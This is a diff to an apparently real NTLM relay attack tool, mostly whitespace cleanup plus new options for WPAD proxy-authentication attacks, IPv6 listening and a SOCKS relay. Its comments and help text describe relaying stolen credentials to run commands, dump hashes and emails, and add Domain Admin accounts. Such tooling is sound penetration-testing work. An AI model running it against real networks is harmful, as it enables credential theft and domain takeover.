@@ -16,23 +16,23 @@
 # by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc).
 # It receives a list of targets and for every connection received it
 # will choose the next target and try to relay the credentials. Also, if
-# specified, it will first to try authenticate against the client connecting 
+# specified, it will first to try authenticate against the client connecting
 # to us.
-# 
-# It is implemented by invoking a SMB and HTTP Server, hooking to a few 
+#
+# It is implemented by invoking a SMB and HTTP Server, hooking to a few
 # functions and then using the specific protocol clients (e.g. SMB, LDAP).
 # It is supposed to be working on any LM Compatibility level. The only way
 # to stop this attack is to enforce on the server SPN checks and or signing.
-# 
+#
 # If the target system is enforcing signing and a machine account was provided,
-# the module will try to gather the SMB session key through 
+# the module will try to gather the SMB session key through
 # NETLOGON (CVE-2015-0005)
 #
-# If the authentication against the targets succeed, the client authentication 
-# success as well and a valid connection is set against the local smbserver. 
-# It's up to the user to set up the local smbserver functionality. One option 
-# is to set up shares with whatever files you want to the victim thinks it's 
-# connected to a valid SMB server. All that is done through the smb.conf file or 
+# If the authentication against the targets succeed, the client authentication
+# success as well and a valid connection is set against the local smbserver.
+# It's up to the user to set up the local smbserver functionality. One option
+# is to set up shares with whatever files you want to the victim thinks it's
+# connected to a valid SMB server. All that is done through the smb.conf file or
 # programmatically.
 #
 
@@ -217,7 +217,7 @@ class LDAPAttack(Thread):
             logging.info('User is not a Domain Admin')
             if not dumpedDomain and self.config.dumpdomain:
                 #do this before the dump is complete because of the time this can take
-                dumpedDomain = True 
+                dumpedDomain = True
                 logging.info('Dumping domain info for first time')
                 domainDumper.domainDump()
                 logging.info('Domain info dumped into lootdir!')
@@ -235,7 +235,7 @@ class HTTPAttack(Thread):
         #Default action: Dump requested page to file, named username-targetname.html
 
         #You can also request any page on the server via self.client.session,
-        #for example with: 
+        #for example with:
         #result = self.client.session.get('http://secretserver/secretpage.html')
         #print result.content
 
@@ -360,10 +360,10 @@ if __name__ == '__main__':
                                                         'automatically (only valid with -tf)')
     parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient/mssqlclient console instead'
                         'of executing a command after a successful relay. This console will listen locally on a '
-                        ' tcp port and can be reached with for example netcat.')    
+                        ' tcp port and can be reached with for example netcat.')
     # Interface address specification
     parser.add_argument('-ip','--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
-                  'bind SMB and HTTP servers',default='0.0.0.0')
+                  'bind SMB and HTTP servers',default='')
 
     parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection (HTTP server only)')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
@@ -380,11 +380,16 @@ if __name__ == '__main__':
                         'interacting with the domain to grab a session key for signing, format is domain/machine_name')
     parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
     parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
+    parser.add_argument('-socks', action='store_true', default=False,
+                        help='Launch a SOCKS proxy for the connection relayed')
+    parser.add_argument('-wh','--wpad-host', action='store',help='Enable serving a WPAD file for Proxy Authentication attack, '
+                                                                   'setting the proxy host to the one supplied.')
+    parser.add_argument('-wa','--wpad-auth-num', action='store',help='Prompt for authentication N times for clients without MS16-077 installed '
+                                                                   'before serving a WPAD file.')
+    parser.add_argument('-6','--ipv6', action='store_true',help='Listen on both IPv6 and IPv4')
 
     #SMB arguments
     smboptions = parser.add_argument_group("SMB client options")
-    smboptions.add_argument('-socks', action='store_true', default=False,
-                        help='Launch a SOCKS proxy for the connection relayed')
     smboptions.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
                                      'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     smboptions.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
@@ -395,22 +400,22 @@ if __name__ == '__main__':
     mssqloptions = parser.add_argument_group("MSSQL client options")
     mssqloptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
                         '(can specify multiple)')
-    
+
     #HTTP options (not in use for now)
     # httpoptions = parser.add_argument_group("HTTP client options")
     # httpoptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
-    #                     '(can specify multiple)')   
+    #                     '(can specify multiple)')
 
     #LDAP options
     ldapoptions = parser.add_argument_group("LDAP client options")
-    ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information') 
-    ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin') 
+    ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information')
+    ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin')
 
-    #IMAP options 
+    #IMAP options
     imapoptions = parser.add_argument_group("IMAP client options")
     imapoptions.add_argument('-k','--keyword', action='store', metavar="KEYWORD", required=False, default="password", help='IMAP keyword to search for. '
                         'If not specified, will search for mails containing "password"')
-    imapoptions.add_argument('-m','--mailbox', action='store', metavar="MAILBOX", required=False, default="INBOX", help='Mailbox name to dump. Default: INBOX') 
+    imapoptions.add_argument('-m','--mailbox', action='store', metavar="MAILBOX", required=False, default="INBOX", help='Mailbox name to dump. Default: INBOX')
     imapoptions.add_argument('-a','--all', action='store_true', required=False, help='Instead of searching for keywords, '
                         'dump all emails')
     imapoptions.add_argument('-im','--imap-max', action='store',type=int, required=False,default=0, help='Max number of emails to dump '
@@ -478,6 +483,8 @@ if __name__ == '__main__':
         c.setMSSQLOptions(options.query)
         c.setInteractive(options.interactive)
         c.setIMAPOptions(options.keyword,options.mailbox,options.all,options.imap_max)
+        c.setIPv6(options.ipv6)
+        c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
         c.setInterfaceIp(options.interface_ip)
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
@@ -498,7 +505,7 @@ if __name__ == '__main__':
 
         s = server(c)
         s.start()
-        
+
     print ""
     logging.info("Servers started, waiting for connections")
     while True:
